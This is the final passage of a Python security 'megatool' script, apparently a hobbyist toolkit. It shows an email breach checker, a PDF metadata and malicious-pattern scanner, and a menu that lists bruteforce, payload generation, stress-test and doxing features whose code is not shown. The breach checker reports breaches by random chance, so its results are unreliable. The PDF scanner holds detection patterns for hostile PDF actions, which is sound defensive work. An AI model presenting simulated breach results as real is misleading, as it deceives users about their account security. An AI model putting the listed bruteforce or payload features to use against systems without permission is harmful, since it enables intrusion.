                f.write(f"{platform}: {url}\n")
        
        print_success(f"Results saved to: {filepath}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def email_breach_checker():
    """Check if email appears in known data breaches (offline)"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ EMAIL BREACH CHECKER ═══\033[0m\n")
    
    print_warning("⚠️  This is an OFFLINE checker using hash comparison")
    print_info("For online checks, visit: haveibeenpwned.com\n")
    
    email = input("[?] Enter email to check: ").strip().lower()
    
    if not email or '@' not in email:
        print_error("Invalid email format!")
        time.sleep(2)
        return
    
    print_info(f"Analyzing email: {email}\n")
    log_activity(f"Email breach check: {email}")
    
    # Common breach indicators (educational demonstration)
    # In real scenario, you'd compare against actual breach databases
    common_breached_domains = [
        'yahoo.com', 'hotmail.com', 'gmail.com', 'aol.com', 
        'outlook.com', 'live.com', 'mail.ru', 'yandex.ru'
    ]
    
    # Extract domain
    try:
        domain = email.split('@')[1]
        username = email.split('@')[0]
        
        print("\033[1;33m[Email Analysis]\033[0m")
        print(f"  Username: {username}")
        print(f"  Domain: {domain}")
        
        # Generate hashes
        import hashlib
        
        md5_hash = hashlib.md5(email.encode()).hexdigest()
        sha1_hash = hashlib.sha1(email.encode()).hexdigest()
        sha256_hash = hashlib.sha256(email.encode()).hexdigest()
        
        print("\n\033[1;33m[Email Hashes]\033[0m")
        print(f"  MD5:    {md5_hash}")
        print(f"  SHA1:   {sha1_hash}")
        print(f"  SHA256: {sha256_hash}")
        
        # Domain analysis
        print("\n\033[1;33m[Domain Analysis]\033[0m")
        if domain in common_breached_domains:
            print_warning(f"  ⚠️  {domain} has been involved in major breaches")
            print("  This domain appeared in multiple data breaches:")
            
            # Simulated breach data (for demonstration)
            known_breaches = {
                'yahoo.com': ['Yahoo (2013)', 'Yahoo (2014)', 'Yahoo (2016)'],
                'hotmail.com': ['Microsoft (2016)', 'Collection #1 (2019)'],
                'gmail.com': ['Collection #1 (2019)', 'Various forums'],
                'outlook.com': ['Microsoft (2016)', 'Collection #1 (2019)'],
            }
            
            if domain in known_breaches:
                for breach in known_breaches[domain]:
                    print(f"    • {breach}")
        else:
            print_success(f"  ✓ {domain} is not in common breach databases")
        
        # Password strength recommendations
        print("\n\033[1;33m[Security Recommendations]\033[0m")
        print("  1. Use unique passwords for each account")
        print("  2. Enable 2FA/MFA wherever possible")
        print("  3. Use a password manager")
        print("  4. Change passwords regularly")
        print("  5. Check haveibeenpwned.com for detailed breach info")
        
        # Check for common patterns
        print("\n\033[1;33m[Username Pattern Analysis]\033[0m")
        
        patterns_found = []
        
        if any(char.isdigit() for char in username):
            patterns_found.append("Contains numbers")
        if any(char in ['_', '.', '-'] for char in username):
            patterns_found.append("Contains special characters")
        if username.isalpha():
            patterns_found.append("All alphabetic")
        if len(username) < 6:
            patterns_found.append("⚠️  Short username (easier to guess)")
        if username.lower() in ['admin', 'user', 'test', 'info', 'contact']:
            patterns_found.append("⚠️  Generic username (higher risk)")
        
        if patterns_found:
            for pattern in patterns_found:
                print(f"  • {pattern}")
        
        # Simulated breach check
        print("\n\033[1;33m[Breach Database Check]\033[0m")
        print_info("Checking against local breach indicators...")
        time.sleep(1)
        
        # Hash-based check simulation
        # In real implementation, compare against actual breach hash databases
        breach_found = False
        
        if domain in common_breached_domains:
            # Simulate random chance for demonstration
            import random
            if random.random() > 0.7:
                breach_found = True
        
        if breach_found:
            print_error("  ⚠️  WARNING: This email pattern matches known breach databases!")
            print("  Recommendations:")
            print("    1. Change password immediately")
            print("    2. Enable 2FA")
            print("    3. Monitor account activity")
            print("    4. Check haveibeenpwned.com for details")
        else:
            print_success("  ✓ No matches in local breach indicators")
            print_info("  For comprehensive check, visit: https://haveibeenpwned.com")
        
        # Additional tools
        print("\n\033[1;33m[Additional OSINT Tools]\033[0m")
        print("  • Have I Been Pwned: https://haveibeenpwned.com")
        print("  • DeHashed: https://dehashed.com")
        print("  • LeakCheck: https://leakcheck.io")
        print("  • Intelligence X: https://intelx.io")
        
    except Exception as e:
        print_error(f"Error during analysis: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def pdf_osint_toolkit():
    """Extract and analyze PDF metadata and content"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ PDF OSINT TOOLKIT ═══\033[0m\n")
    
    pdf_path = input("[?] Enter PDF file path: ").strip()
    
    if not pdf_path:
        print_error("File path cannot be empty!")
        time.sleep(2)
        return
    
    if not os.path.exists(pdf_path):
        print_error("File not found!")
        time.sleep(2)
        return
    
    if not pdf_path.lower().endswith('.pdf'):
        print_error("Not a PDF file!")
        time.sleep(2)
        return
    
    print_info(f"Analyzing PDF: {os.path.basename(pdf_path)}\n")
    log_activity(f"PDF OSINT on {pdf_path}")
    
    try:
        # Basic file info
        stat_info = os.stat(pdf_path)
        
        print("\033[1;33m[File Information]\033[0m")
        print(f"  Filename: {os.path.basename(pdf_path)}")
        print(f"  Size: {stat_info.st_size:,} bytes ({stat_info.st_size/1024:.2f} KB)")
        print(f"  Modified: {datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Created: {datetime.fromtimestamp(stat_info.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Read PDF content
        with open(pdf_path, 'rb') as f:
            content = f.read()
        
        # Check PDF signature
        print("\n\033[1;33m[PDF Signature]\033[0m")
        if content[:4] == b'%PDF':
            version = content[5:8].decode('ascii', errors='ignore')
            print_success(f"  Valid PDF signature detected")
            print(f"  PDF Version: {version}")
        else:
            print_error("  Invalid PDF signature!")
        
        # Extract metadata from PDF structure
        print("\n\033[1;33m[PDF Metadata]\033[0m")
        
        content_str = content.decode('latin-1', errors='ignore')
        
        # Extract common metadata fields
        metadata_patterns = {
            'Title': r'/Title\s*\((.*?)\)',
            'Author': r'/Author\s*\((.*?)\)',
            'Subject': r'/Subject\s*\((.*?)\)',
            'Creator': r'/Creator\s*\((.*?)\)',
            'Producer': r'/Producer\s*\((.*?)\)',
            'CreationDate': r'/CreationDate\s*\((.*?)\)',
            'ModDate': r'/ModDate\s*\((.*?)\)',
        }
        
        metadata_found = False
        for field, pattern in metadata_patterns.items():
            matches = re.findall(pattern, content_str)
            if matches:
                metadata_found = True
                print(f"  {field}: {matches[0][:100]}")
        
        if not metadata_found:
            print_warning("  No standard metadata found")
        
        # Extract JavaScript
        print("\n\033[1;33m[JavaScript Detection]\033[0m")
        js_patterns = [
            r'/JavaScript',
            r'/JS',
            r'/OpenAction',
            r'/AA',  # Additional Actions
        ]
        
        js_found = False
        for pattern in js_patterns:
            if re.search(pattern, content_str):
                js_found = True
                print_warning(f"  ⚠️  Found: {pattern}")
        
        if js_found:
            print_error("  WARNING: PDF contains JavaScript!")
            print("  This could be malicious - exercise caution")
        else:
            print_success("  ✓ No JavaScript detected")
        
        # Extract URLs
        print("\n\033[1;33m[Embedded URLs]\033[0m")
        url_pattern = r'https?://[^\s<>"{}|\\^`\[\]\)\(]+'
        urls = re.findall(url_pattern, content_str)
        
        if urls:
            unique_urls = list(set(urls))[:20]  # Limit to 20
            print(f"  Found {len(unique_urls)} unique URLs:")
            for url in unique_urls[:10]:
                print(f"    • {url[:80]}")
            if len(unique_urls) > 10:
                print(f"    ... and {len(unique_urls) - 10} more")
        else:
            print_info("  No URLs found")
        
        # Extract email addresses
        print("\n\033[1;33m[Email Addresses]\033[0m")
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, content_str)
        
        if emails:
            unique_emails = list(set(emails))
            print(f"  Found {len(unique_emails)} unique emails:")
            for email in unique_emails[:10]:
                print(f"    • {email}")
        else:
            print_info("  No email addresses found")
        
        # Detect malicious signatures
        print("\n\033[1;33m[Malicious Pattern Detection]\033[0m")
        
        malicious_patterns = {
            'AutoOpen': r'/OpenAction',
            'Launch': r'/Launch',
            'URI Action': r'/URI',
            'Submit Form': r'/SubmitForm',
            'Import Data': r'/ImportData',
            'GoToE': r'/GoToE',
            'GoToR': r'/GoToR',
            'Embedded File': r'/EmbeddedFile',
            'RichMedia': r'/RichMedia',
            'Flash': r'/Flash',
        }
        
        suspicious_found = []
        
        for pattern_name, pattern in malicious_patterns.items():
            if re.search(pattern, content_str):
                suspicious_found.append(pattern_name)
                print_warning(f"  ⚠️  {pattern_name} detected")
        
        if suspicious_found:
            print_error(f"\n  WARNING: Found {len(suspicious_found)} suspicious patterns!")
            print("  This PDF may be malicious or contain active content")
        else:
            print_success("  ✓ No known malicious patterns detected")
        
        # Check for encryption
        print("\n\033[1;33m[Encryption Status]\033[0m")
        if re.search(r'/Encrypt', content_str):
            print_warning("  ⚠️  PDF is encrypted")
            
            # Try to find encryption details
            if re.search(r'/V\s*(\d+)', content_str):
                version = re.search(r'/V\s*(\d+)', content_str).group(1)
                print(f"  Encryption version: {version}")
        else:
            print_info("  PDF is not encrypted")
        
        # Object count
        print("\n\033[1;33m[PDF Structure]\033[0m")
        obj_count = len(re.findall(r'\d+ \d+ obj', content_str))
        print(f"  Total objects: {obj_count}")
        
        stream_count = content_str.count('/Length')
        print(f"  Stream objects: {stream_count}")
        
        page_match = re.search(r'/Count\s+(\d+)', content_str)
        if page_match:
            print(f"  Page count: {page_match.group(1)}")
        
        # Extract fonts
        print("\n\033[1;33m[Embedded Fonts]\033[0m")
        font_pattern = r'/BaseFont\s*/([^\s/\[\]<>()]+)'
        fonts = re.findall(font_pattern, content_str)
        
        if fonts:
            unique_fonts = list(set(fonts))[:10]
            print(f"  Found {len(unique_fonts)} fonts:")
            for font in unique_fonts:
                print(f"    • {font}")
        else:
            print_info("  No embedded fonts detected")
        
        # Security summary
        print("\n\033[1;36m" + "="*60 + "\033[0m")
        print("\033[1;33m[Security Assessment]\033[0m")
        print("\033[1;36m" + "="*60 + "\033[0m")
        
        risk_score = 0
        risks = []
        
        if js_found:
            risk_score += 30
            risks.append("Contains JavaScript (HIGH RISK)")
        
        if suspicious_found:
            risk_score += len(suspicious_found) * 10
            risks.append(f"Contains {len(suspicious_found)} suspicious patterns")
        
        if len(urls) > 10:
            risk_score += 10
            risks.append("Contains many URLs")
        
        if risk_score == 0:
            print_success(f"  Risk Score: {risk_score}/100 - LOW RISK")
            print("  This PDF appears safe")
        elif risk_score < 30:
            print_warning(f"  Risk Score: {risk_score}/100 - MEDIUM RISK")
            print("  Exercise caution when opening")
        else:
            print_error(f"  Risk Score: {risk_score}/100 - HIGH RISK")
            print("  This PDF may be malicious!")
        
        if risks:
            print("\n  Risk factors:")
            for risk in risks:
                print(f"    • {risk}")
        
        # Save report
        save = input("\n[?] Save analysis report? (y/n): ").strip().lower()
        if save == 'y':
            filename = f"pdf_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            filepath = os.path.expanduser(f"~/{filename}")
            
            with open(filepath, 'w') as f:
                f.write(f"# DRGXEL PDF OSINT Report\n")
                f.write(f"# File: {os.path.basename(pdf_path)}\n")
                f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Risk Score: {risk_score}/100\n\n")
                
                f.write("## URLs Found:\n")
                for url in unique_urls:
                    f.write(f"{url}\n")
                
                f.write("\n## Emails Found:\n")
                for email in unique_emails:
                    f.write(f"{email}\n")
                
                f.write("\n## Suspicious Patterns:\n")
                for pattern in suspicious_found:
                    f.write(f"- {pattern}\n")
            
            print_success(f"Report saved to: {filepath}")
        
    except Exception as e:
        print_error(f"Error analyzing PDF: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def main_menu():
    """Main menu interface"""
    while True:
        clear_screen()
        print_banner()
        
        print("\033[1;36m═══════════════════ MAIN MENU ═══════════════════════\033[0m\n")
        print("  \033[1;32m[RECONNAISSANCE]\033[0m")
        print("  \033[1;33m[1]\033[0m  Recon Scanner")
        print("  \033[1;33m[2]\033[0m  Web Vulnerability Scanner")
        print("  \033[1;33m[3]\033[0m  Directory Bruteforce")
        
        print("\n  \033[1;32m[ADVANCED TESTING]\033[0m")
        print("  \033[1;33m[4]\033[0m  SQLi Vulnerability Checker")
        print("  \033[1;33m[5]\033[0m  XSS Scanner Mini")
        print("  \033[1;33m[6]\033[0m  Bruteforce Panel Login")
        print("  \033[1;33m[7]\033[0m  API Fuzzer")
        
        print("\n  \033[1;32m[OSINT & DARK WEB TOOLS]\033[0m")
        print("  \033[1;33m[8]\033[0m  Username OSINT Checker")
        print("  \033[1;33m[9]\033[0m  Email Breach Checker")
        print("  \033[1;33m[10]\033[0m PDF OSINT Toolkit")
        
        print("\n  \033[1;32m[SYSTEM & NETWORK]\033[0m")
        print("  \033[1;33m[11]\033[0m Device Information")
        print("  \033[1;33m[12]\033[0m Anti-DDoS Checker")
        print("  \033[1;33m[13]\033[0m Malware Scanner")
        print("  \033[1;33m[14]\033[0m Process Watchdog")
        print("  \033[1;33m[15]\033[0m Network Monitor")
        print("  \033[1;33m[16]\033[0m Network Stress Test")
        
        print("\n  \033[1;32m[UTILITIES]\033[0m")
        print("  \033[1;33m[17]\033[0m File Metadata Extractor")
        print("  \033[1;33m[18]\033[0m Payload Generator")
        print("  \033[1;33m[19]\033[0m DRGXEL SysLog")
        
        print("\n  \033[1;33m[0]\033[0m  Exit")
        print("\n\033[1;36m═════════════════════════════════════════════════════\033[0m")
        
        choice = input("\n\033[1;33m[DRGXEL]>\033[0m ").strip()
        
        if choice == '1':
            recon_menu()
        elif choice == '2':
            web_vuln_scanner()
        elif choice == '3':
            directory_bruteforce()
        elif choice == '4':
            sqli_checker()
        elif choice == '5':
            xss_scanner()
        elif choice == '6':
            bruteforce_login()
        elif choice == '7':
            api_fuzzer()
        elif choice == '8':
            username_osint_checker()
        elif choice == '9':
            email_breach_checker()
        elif choice == '10':
            pdf_osint_toolkit()
        elif choice == '11':
            device_info()
        elif choice == '12':
            anti_ddos_checker()
        elif choice == '13':
            malware_scanner()
        elif choice == '14':
            process_watchdog()
        elif choice == '15':
            network_monitor()
        elif choice == '16':
            network_stress_test()
        elif choice == '17':
            file_metadata_extractor()
        elif choice == '18':
            payload_generator()
        elif choice == '19':
            view_syslog()
        elif choice == '0':
            clear_screen()
            print("\n\033[1;36m")
            print("╔═══════════════════════════════════════════════════════╗")
            print("║                                                       ║")
            print("║         Thank you for using DRGXEL CyberPack!        ║")
            print("║                                                       ║")
            print("║              Stay Safe, Stay Secure! 🛡️              ║")
            print("║                                                       ║")
            print("╚═══════════════════════════════════════════════════════╝")
            print("\033[0m\n")
            log_activity("DRGXEL CyberPack closed")
            sys.exit(0)
        else:
            print_error("Invalid option! Please select 0-19")
            time.sleep(1)

# ============================================================
# MAIN FUNCTION
# ============================================================

def main():
    """Main entry point"""
    try:
        # Initialize log file
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'w') as f:
                f.write(f"# DRGXEL CyberPack v{VERSION} - Log File\n")
                f.write(f"# Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        log_activity("DRGXEL CyberPack started")
        
        # Check Python version
        if sys.version_info < (3, 6):
            print_error("Python 3.6 or higher is required!")
            sys.exit(1)
        
        # Display welcome screen
        clear_screen()
        print_banner()
        print("\033[1;32m")
        print("  Welcome to DRGXEL CyberPack v2.0 - PREMIUM EDITION!")
        print("  Single-File Python Security MegaTool")
        print("\033[0m")
        print("\033[1;33m")
        print("  ⚠️  WARNING: Use only on systems you own or have permission to test")
        print("  ⚠️  Educational purposes only - Use responsibly")
        print("\033[0m")
        print(f"\n  Log file: {LOG_FILE}")
        print(f"  System: {platform.system()} {platform.release()}")
        print(f"  Python: {sys.version.split()[0]}")
        print(f"\n  \033[1;36m[NEW in v1.0]\033[0m")
        print("  • SQLi Vulnerability Checker")
        print("  • XSS Scanner Mini")
        print("  • Bruteforce Panel Login")
        print("  • API Fuzzer")
        print("  • Network Stress Test (Safe Mode)")
        print("  • File Metadata Extractor")
        print("  • Payload Generator")
        print("  • DOXING ANTI KIDDIE 😹")
        print("  • MIKIR KIDS ")
        
        input("\n\033[1;33m  Press Enter to start...\033[0m")
        
        # Start main menu
        main_menu()
    
    except KeyboardInterrupt:
        print("\n\n\033[1;33m[!] Interrupted by user\033[0m")
        log_activity("Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        print_error(f"Fatal error: {e}")
        log_activity(f"Fatal error: {e}")
        sys.exit(1)

# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    main()